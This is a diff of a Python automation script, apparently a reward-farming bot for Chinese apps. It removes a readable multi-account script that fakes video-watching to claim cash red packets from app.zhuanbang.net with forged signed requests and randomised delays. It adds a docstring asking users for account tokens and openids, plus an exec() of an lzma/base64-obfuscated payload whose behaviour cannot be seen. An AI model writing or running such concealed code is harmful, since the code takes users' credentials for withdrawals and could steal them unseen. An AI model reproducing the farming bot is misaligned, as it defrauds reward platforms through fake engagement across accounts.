@@ -1,65 +1,13 @@
-#2024-06-29 05:11:29
-import requests
-import os
-import time
-import random
-import hashlib
-class yuanshen():
- def __init__(self,cookie):
-  self.cookie=cookie
-  self.h={"Host":"app.zhuanbang.net","accept":"application/json, image/webp","user-agent":"Mozilla/5.0 (Linux; Android 12; M2104K10AC Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 HuoNiuFusion/1.25.0_231652","x-requested-with":"XMLHttpRequest","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://app.zhuanbang.net/assist/activity/47","accept-language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7","accept-encoding":"gzip","Cookie":f"NiuToken={self.cookie}"}
- def sign_(self):
-  d=f"{self.csrftoken}#{self.sessionId}#{self.time}"
-  byte_string=d.encode('utf-8')
-  sha1=hashlib.sha1()
-  sha1.update(byte_string)
-  sign=sha1.hexdigest()
-  return sign
- def video(self,key):
-  i=0
-  while True:
-   i+=1
-   url=f"https://app.zhuanbang.net/{key}/launch?_random={int(time.time() * 1000)}&type=slide"
-   r=requests.get(url,headers=self.h).json()
-   if r['code']==0:
-    print(f"第[{i}]个红包获取信息成功")
-    self.csrftoken=r['data']['extArgs']['csrfToken']
-    self.sessionId=r['data']['extArgs']['sessionId']
-    self.time=int(time.time())
-    url=f"https://app.zhuanbang.net/{key}/award/grant?_t={self.time}"
-    data={"csrfToken":f"{self.csrftoken}","deviceId":f"{self.sessionId}","timestamp":f"{self.time}","sign":f"{self.sign_()}"}
-    r=requests.post(url,headers=self.h,data=data).json()
-    if r['code']==0:
-     print(f"第[{i}]个红包领取成功,获得[{r['data']['awardMoney']}]元")
-    else:
-     print(f"第[{i}]个红包领取失败---[{r['msg']}]")
-     break
-   else:
-    print(f"第[{i}]个获取红包信息失败---[{r['msg']}]")
-    break
-   if i>=21:
-    break
-   time.sleep(random.randint(20,48))
- def main(self):
-  print("===========开始执行快手刷视频===========")
-  self.video("kwai_video")
-  print("===========快手刷视频执行完毕===========")
-  print("===========开始执行抖音刷视频===========")
-  self.video("pangle_video")
-  print("===========抖音刷视频执行完毕===========")
-if __name__=='__main__':
- cookie=''
- if not cookie:
-  cookie=os.getenv("yuanshen_zb")
-  if not cookie:
-   print("⛔️请设置环境变量:yuanshen_zb")
-   exit()
- cookies=cookie.split("@")
- print(f"一共获取到{len(cookies)}个账号")
- i=1
- for cookie in cookies:
-  print(f"\n--------开始第{i}个账号--------")
-  main=yuanshen(cookie)
-  main.main()
-  print(f"--------第{i}个账号执行完毕--------")
-  i+=1
+"""
+低保
+变量名:kg
+填入token和openid,用&分开,多账号用@
+写了签到和提现
+第一次先自己去签到和提现,授权绑定手机号,不然脚本可能跑不起
+"""
+
+
+import lzma, base64
+exec(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4Ax5BHBdADSbSme4Ujxz4BYljVY8LZ248DJSgkAS3sS/yGHxQ5IpLTG5v+fLNlKMXBq2miIeicCN9Pde08Zkan8YN5fq8RajYKIIH4R9JK1t+Mvst1d+FALOy0KpeS+ER8qJh/vwfbQ50A22A2xSe701PwAWE6x+3bVvfzByRtWzjAGvubJWqjoWa4lc0xhKPAaHzUvkpACo/dRstK7zmqMXzo8aDZtyd9VcUER6Ux4s952owYsVsSj4p69a6DTE4pXaKL8ljyX21Mi1/Y6vc/jmr9uh/sFkjC3qFulooseB7Fkf96c3UZJosIbfOkNrfO2HjKMg46WQD42bULG+Cii2aaw73hQvEs7Jsqf9Gs+fMdmAgHD/gFrAcwcU8Fc9eLYCRPYJK8Pi9cxY18N7V43be6VweCGLCf7acMdingDbAgDy+HxBWT0MoxOA29dJQORUgdfE2t0/PjJceF21JGfcOanMtgU06VOnUdvRayTS7oiMy2nZMjg+h77FzkMNRFZQ3Cbpq0azlWCDnA48V2zqEg3qjBSyh0D8NkyRDJr2v51YOo0LpUDfHPi3k+iubWa5I0242HxARpSdXL9HvDxDaRyhrzDAfs/WXSim5sNHh+2sQ2bGljEgYHe7p27raEqFZCF0r9Aw/pYhr9CV2balT4NsEw3o+LOviXCiyqTTZREVmmpo7WTUi4ktCH3h64PdSLSjN0b/RnH/hXuB7vlNMyECCmBZ1grnJYCysf7Aul6NzLLKxPJjgHeCQACcGHkZ/mlwqUrx23TnNwWfa9+P7vyR4nH5EP7RpPpfQo9CWqycOjfpm5viMjF0CXKhC3yeuviGbi1G36dEQkKHqAvCi5fPBhIrcrU0s8HSKD5AxcYPYNyNDGqoqJNbdt7dYOroj7naHFhoxWFI8zU7wb3aPiNgKmvqBuySpev4u7LGWbslMs9QA5PuoHt6Vxfl9MQ8YfN0y6WM3/c/nkTBeAg9vi1eglMVhjSMIv/Xpqz6Ugd6eR3Bw6t8CSaDRZHHRYEByVh1LbY2AxLIDN/7gGmRjvzNYGHO/FR2mDU08ZIzlxdAAjGCCSxpiE530pU8Etp+tz6pPzvT1ERhv8IaydO+wRSwYkBBwA0+gP6K+I4b1RbvCDeZouKGRW4tJjflVheglV+V1tiq3y0ox/FUB13X0YY2Uifm/DX5xc6bN4aDIaMuv3IpH9wLV5Vw8/A11wHrdYkHkjGSjvyb2pfhfYIyCrGbWIG/W4GLA+xRk0hD/klViRKaMl1mWjivwF/uai4b1VKOb3SyXFtvdDzHpndYz/4aNjbdEyHl0v8VKxy7oNkHV+7ApH5rpOK8EimfYu861w00BqXDm5/6gMgYNdPHTYmlNb77UoLsQsXVPPoSwH1oMsR3u4TI7Kr4wz/Hx2h9XLy8xOA/BSgedp/SGkA7Z97oV6zIHD7fcfEWqQvozvE/IcBihCALBN1oLfoLiD5eJYO4qif3CyD0ckjYYyTmBrZKmB9H5DRKmgRiipOFGfz5VJ0KALDMV+s/DZWWAAGMCfoYAAAEZtlcscRn+wIAAAAABFla')))
+
+
